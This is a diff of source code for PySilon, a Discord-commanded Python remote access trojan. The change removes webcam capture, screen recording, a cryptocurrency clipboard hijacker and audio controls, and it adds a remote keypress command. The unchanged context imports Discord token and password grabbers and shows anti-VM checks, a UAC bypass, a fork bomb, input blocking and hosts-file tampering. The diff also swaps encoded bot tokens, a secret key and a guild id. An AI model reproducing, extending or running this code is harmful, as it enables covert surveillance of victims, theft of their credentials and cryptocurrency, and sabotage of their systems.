@@ -18,27 +18,15 @@ import pyaudio
 from psutil import process_iter, Process
 from win32process import GetWindowThreadProcessId
 from win32gui import GetForegroundWindow
-import pygame.camera
-import pygame.image
-import time
-import pyautogui
-import numpy as np
-import imageio
 from pynput import keyboard, mouse
 import ctypes
-import pyperclip
-import re
-import json
-import threading
 from html2image import Html2Image
 from PIL import Image
 import pyttsx3
-from ctypes import cast, POINTER
-from comtypes import CLSCTX_ALL
-from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-import pygame
 import monitorcontrol
+import threading
 from urllib.parse import urlparse
+import pyautogui
 from PIL import Image, ImageDraw
 from win32print import * 
 from win32gui import *
@@ -46,6 +34,8 @@ from win32con import *
 from win32api import *
 import random
 import math
+import json
+import time
 from resources.protections import protection_check, fake_mutex_code # [pysilon_mark] !anti-vm
 from resources.discord_token_grabber import * # [pysilon_mark] !grabber
 from resources.passwords_grabber import * # [pysilon_mark] !grabber
@@ -71,10 +61,10 @@ if not IsAdmin():
         if UACbypass():
             os._exit(0)
 auto = 'auto'
-bot_tokens = ['wEUO5smMRlGS1g1ZfFHaxgDRoh1YnRGaMJDZCJWe11SOyoHd0hmL24kTZp3RuEkT3VFVPFTU61ENrR1T5NGVPVzYU5EeRRVT']
-software_registry_name = 'Windows64'
-software_directory_name = 'C:/Windows'
-software_executable_name = 'fsociety tool.exe'
+bot_tokens = ['VJncPpEWXp3dGRDWShEVZlXaMhWO50WetEzMJBXbXtWc1dlYzsmLpJHMRh0RuE1T4FlaOJzYE1keFR1TwkkaNpXRq1UNJRVT', 'VJncPpEWXp3dGRDWShEVZlXaMhWO50WetEzMJBXbXtWc1dlYzsmLpJHMRh0RuE1T4FlaOJzYE1keFR1TwkkaNpXRq1UNJRVT', 'VJncPpEWXp3dGRDWShEVZlXaMhWO50WetEzMJBXbXtWc1dlYzsmLpJHMRh0RuE1T4FlaOJzYE1keFR1TwkkaNpXRq1UNJRVT']
+software_registry_name = 'qeewq'
+software_directory_name = '123'
+software_executable_name = 'baba.exe'
 channel_ids = {                                                    ##
     'info': True,
     'main': True,
@@ -83,8 +73,8 @@ channel_ids = {                                                    ##
     'recordings': False,
     'voice': True
 }                                                                  ##
-secret_key = 'c5cf40c579af6cf8bdfe92eca2006bd851e254a7d38ba1f365a458a66111cae4'
-guild_id = 1402120071437877369
+secret_key = 'e7c5940c9455bb56141a33e9f7a04c13abd3942c0681772c20cf77368a4c3bbd'
+guild_id = 1292132842389635113
 if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [pysilon_mark] !anti-vm
     os._exit(0) # [pysilon_mark] !anti-vm
 if IsAdmin():
@@ -932,55 +922,6 @@ async def on_message(message):
                             reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                 else:
                     reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
-            elif message.content[:7] == '.webcam':
-                await message.delete()
-                if message.content.strip() == '.webcam':
-                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
-                    await reaction_msg.add_reaction('🔴')
-                else:
-                    if message.content[8:] == 'photo':
-                        pygame.camera.init()
-                        cameras = pygame.camera.list_cameras()
-                        if not cameras:
-                            reaction_msg = await message.channel.send('No cameras found.')
-                            await reaction_msg.add_reaction('🔴')
-                            return
-                        camera = pygame.camera.Camera(cameras[0])
-                        camera.start()
-                        time.sleep(1)
-                        image = camera.get_image()
-                        camera.stop()
-                        pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
-                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
-                        await reaction_msg.add_reaction('📌')
-                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
-                    else:
-                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
-                        await reaction_msg.add_reaction('🔴')
-            elif message.content == '.screenrec':
-                await message.delete()
-                await message.channel.send("`Recording... Please wait.`")
-                output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
-                screen_width, screen_height = pyautogui.size()
-                screen_region = (0, 0, screen_width, screen_height)
-                frames = []
-                duration = 15
-                fps = 30
-                num_frames = duration * fps
-                start_time = time.time()
-                try:
-                    for _ in range(num_frames):
-                        img = pyautogui.screenshot(region=screen_region)
-                        frame = np.array(img)
-                        frames.append(frame)
-                    imageio.mimsave(output_file, frames, fps=fps, quality=8)
-                    reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
-                    await reaction_msg.add_reaction('📌')
-                    subprocess.run(f'del {output_file}', shell=True)
-                except Exception as e:
-                    embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    await message.channel.send(embed=embed)
             elif message.content == '.block-input':
                 if not input_blocked:
                     await message.delete()
@@ -1033,57 +974,6 @@ async def on_message(message):
                     ctypes.c_uint(6),
                    ctypes.byref(ctypes.c_uint())
                 )
-            elif message.content == '.start-clipper':
-                if clipper_stop:
-                    await message.delete()
-                    clipper_stop = False
-                    script_dir = os.path.dirname(os.path.abspath(__file__))
-                    config_path = os.path.join(script_dir, 'crypto_clipper.json')
-                    with open(config_path) as f:
-                        addresses = json.load(f)
-                    def match():
-                        clipboard = str(pyperclip.paste())
-                        btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
-                        eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
-                        doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
-                        ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
-                        xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
-                        bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
-                        dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
-                        trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
-                        xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
-                        xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
-                        for currency, address in addresses.items():
-                            if eval(f'{currency.lower()}_match'):
-                                if address and address != clipboard:
-                                    pyperclip.copy(address)
-                                break
-                    def wait_for_paste():
-                        while not clipper_stop:
-                            pyperclip.waitForNewPaste()
-                            match()
-                    thread = threading.Thread(target=wait_for_paste)
-                    thread.start()
-                    embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    await message.channel.send(embed=embed)
-                else:
-                    await message.delete()
-                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    await message.channel.send(embed=embed)
-            elif message.content == '.stop-clipper':
-                await message.delete()
-                if not clipper_stop:
-                    thread.join()
-                    embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    await message.channel.send(embed=embed)
-                    clipper_stop = True
-                else:
-                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    await message.channel.send(embed=embed)
             elif message.content == ".forkbomb":
                 await message.delete()
                 embed = discord.Embed(title="💣 Starting...",description=f'```Starting fork bomb... This process may take some time.```', colour=discord.Colour.dark_theme())
@@ -1163,49 +1053,6 @@ async def on_message(message):
                     embed = discord.Embed(title="🟢 Success",description=f'```Successfully played TTS message: "{requested_tts}"```', colour=discord.Colour.green())
                     embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                     reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-            elif message.content[:7] == '.volume':
-                await message.delete()
-                if message.content.strip() == '.volume':
-                    embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                else:
-                    volume_int = message.content[8:]
-                    devices = AudioUtilities.GetSpeakers()
-                    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-                    volume = cast(interface, POINTER(IAudioEndpointVolume))
-                    volume_int = int(volume_int)
-                    volume_int = volume_int / 100
-                    if volume_int <= 1 and volume_int >= 0:
-                        volume.SetMasterVolumeLevelScalar(volume_int, None)
-                        embed = discord.Embed(title="🟢 Success",description=f'```Successfully set volume to {volume_int * 100}%```', colour=discord.Colour.green())
-                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                    else:
-                        embed = discord.Embed(title="📛 Error",description='```Syntax: .volume <0 - 100>```', colour=discord.Colour.red())
-                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-            elif message.content[:5] == '.play':
-                await message.delete()
-                if message.content.strip() == '.play':
-                    embed = discord.Embed(title="📛 Error",description='```Syntax: .play <path/to/audio-file.mp3>```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                elif not message.content.endswith('.mp3'):
-                    embed = discord.Embed(title="📛 Error",description='```Not a valid file type.```', colour=discord.Colour.red())
-                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
-                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
-                else:
-                    def play_audio():
-                        audio_file = message.content[6:]
-                        audio_file = audio_file.replace('\\','/')
-                        pygame.mixer.init()
-                        pygame.mixer.music.load(audio_file)
-                        pygame.mixer.music.play()
-                        while pygame.mixer.music.get_busy():
-                            pass
-                        pygame.mixer.quit()
-                    threading.Thread(target=play_audio).start()
             elif message.content == '.monitors-off':
                 if not turned_off:
                     await message.delete()
@@ -1283,6 +1130,24 @@ async def on_message(message):
                         embed = discord.Embed(title="🔴 Hold on!", description=f'```Hostfile not found or no permissions```', colour=discord.Colour.red())
                         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                         await message.channel.send(embed=embed)
+            elif message.content[:4] == '.key':
+                await message.delete()
+                if message.content.strip() == '.key':
+                    embed = discord.Embed(title="📛 Error",description='```Syntax: .key <keys-to-press>```', colour=discord.Colour.red())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+                else:
+                    keystrokes = message.content[5:]
+                    if "ALTTAB" in keystrokes:
+                        pyautogui.hotkey('alt', 'tab')
+                    elif "ALTF4" in keystrokes:
+                        pyautogui.hotkey('alt', 'f4')
+                    else:
+                        for key in keystrokes:
+                            pyautogui.press(key)
+                    embed = discord.Embed(title="🟢 Success",description=f'```All keys have been succesfully pressed```', colour=discord.Colour.green())
+                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
             elif message.content == '.display-graphic':
                 await message.delete()
                 embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
